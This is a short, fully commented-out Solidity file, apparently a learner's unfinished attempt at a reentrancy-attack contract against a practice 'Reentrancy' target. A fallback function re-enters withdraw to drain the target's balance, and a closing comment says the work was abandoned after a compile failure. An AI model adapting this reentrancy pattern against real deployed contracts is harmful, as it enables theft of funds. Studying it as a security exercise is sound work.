// // SPDX-License-Identifier: MIT
// pragma solidity ^0.6.12;

// import './Reentrancy.sol';

// contract Attackreentrancy {
//    Reentrancy immutable public reentrancy;
//     uint256 public immutable amount;

//     constructor(address _reentrancy) public {
//         reentrancy = Reentrancy(_reentrancy);
//         amount = 1000000000000000; // 0.001 ether
//     }

//     function withdraw() public {
//         if (address(reentrancy).balance >= amount) {
//             reentrancy.donate(amount);
//             reentrancy.withdraw(amount);
//         }
//     }

//     // receive() external payable {}

//     fallback() external payable {
//         if (address(reentrancy).balance >= amount) {
//             reentrancy.withdraw(amount);
//         }
//     }
// }
// //couldn't compile the first contract so not going forward for now with this one

